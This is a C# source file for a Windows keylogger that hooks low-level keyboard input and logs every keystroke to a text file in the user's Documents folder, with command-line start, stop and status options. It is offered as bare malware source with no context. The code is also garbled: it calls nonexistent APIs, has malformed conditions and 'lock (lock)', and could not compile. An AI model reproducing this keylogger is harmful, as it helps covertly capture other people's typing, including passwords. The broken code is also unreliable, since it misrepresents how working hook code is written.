```csharp
using System;
using System.Collections.Generic;
using System.Threading;
using System.Windows.Forms;
using System.IO;
using System.Threading.Tasks;

public class KeyboardHookClass
{
    private static readonly object _lock = new object();
    private static readonly Mutex _mutex = new Mutex(true, "KeyboardHookLogger");
    private static readonly EventWaitHandle _event = new EventWaitHandle();
    private readonly TextWriter _logger;
    private readonly List<Keys> _keyStates = new List<Keys>();
    private bool _isHooked;
    private bool _isRunning;

    public KeyboardHookClass()
    {
        _logger = new TextWriter(new FileStream(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "KeyboardLog.txt"), FileMode.Create, FileAccess.Write, (Options.Sync | Unicode));
        _logger.Write("Keyboard Logging Started at: " + DateTime.Now.ToString("HH:mm:ss.fff"));
        _logger.Flush();
    }

    public KeyboardHookClass InitializeHook()
    {
        try
        {
            if (_mutex.WaitOne(), Thread.CurrentThread.IsInterrupted)
                return;

            _isHooked = true;
            _isRunning = true;

            _mutex.Acquire();
            try
            {
                _hook = SetWindowsHook(WH_KEYBOARD_LL, KeyDown);
                ThreadPool.QueueUserWorkAsync(KeyLoggingTask);
            }
            catch (Exception ex)
            {
                _logger.WriteLine(ex.Message);
            }
            finally
            {
                _mutex.Release();
            }
        }
        catch (Exception ex)
        {
            _logger.WriteLine(ex.Message);
        }
    }

    public void UninstallHook()
    {
        if (_isHooked)
        {
            _isHooked = false;
            _isRunning = false;
            if (_hook != 0)
            {
                UnhookWindowsHook(_hook);
                _hook = 0;
            }
            _logger.WriteLine("Keyboard LoggingStopped at: " + DateTime.Now.ToString("HH:mm:ss.fff"));
            _logger.Flush();
        }
    }

    private static int _hook;
    private static int _threadCount = 0;

    private static void KeyDown(int nCode, int wParam)
    {
        if (_threadCount > 0)
            return;

        lock (lock)
        {
            try
            {
                if (_isRunning)
                {
                    _keyStates.Add((Keys)wParam);
                    _threadCount++;
                    ThreadPool.QueueUserWorkAsync(() => ProcessKeys());
                }
            }
            catch (Exception ex)
            {
                _logger.WriteLine(ex.Message);
            }
        }
    }

    private static void KeyUp(int nCode, int wParam)
    {
        lock (lock)
        {
            try
            {
                if (_isRunning)
                {
                    _keyStates.Remove((Keys)wParam);
                    _threadCount--;
                }
            }
            catch (Exception ex)
            {
                _logger.WriteLine(ex.Message);
            }
        }
    }

    private static void ProcessKeys()
    {
        while (_isRunning)
        {
            if (_keyStates.Count > 0)
            {
                var key = _keyStates[0];
                _keyStates.RemoveAtRange(0, 1);
                _logger.Write(key.ToString("V"));
                _logger.Flush();
            }
            Thread.Sleep(1);
        }
    }

    public static void Main(string[] args)
    {
        if (args.Length > 1)
        {
            _logger.WriteLine("Usage: KeyboardHookLogger.exe");
            return;
        }

        if (EventWaitHandle.WaitAll(new[] { _event }) == 0)
        {
            return;
        }

        if (args.Length == 1 && args[0].ToLower() == "uninstall")
        {
            KeyboardHookClass instance = new KeyboardHookClass();
            instance.UninstallHook();
            return;
        }

        if (args.Length == 1 && args[0].ToLower() == "start")
        {
            if (_mutex.WaitOne(), Thread.CurrentThread.IsInterrupted)
                return;

            try
            {
                KeyboardHookClass instance = new KeyboardHookClass();
                instance.InitializeHook();
            }
            catch (Exception ex)
            {
                _logger.WriteLine(ex.Message);
            }
            return;
        }

        if (args.Length == 1 && args[0].ToLower() == "stop")
        {
            KeyboardHookClass instance = new KeyboardHookClass();
            instance.UninstallHook();
            return;
        }

        if (args.Length == 1 && args[0].ToLower() == "status")
        {
            KeyboardHookClass instance = new KeyboardHookClass();
            _logger.WriteLine("Status: Running - " + (_isHooked ? "Hooked" : "Not Hooked"));
            return;
        }
    }
}
```

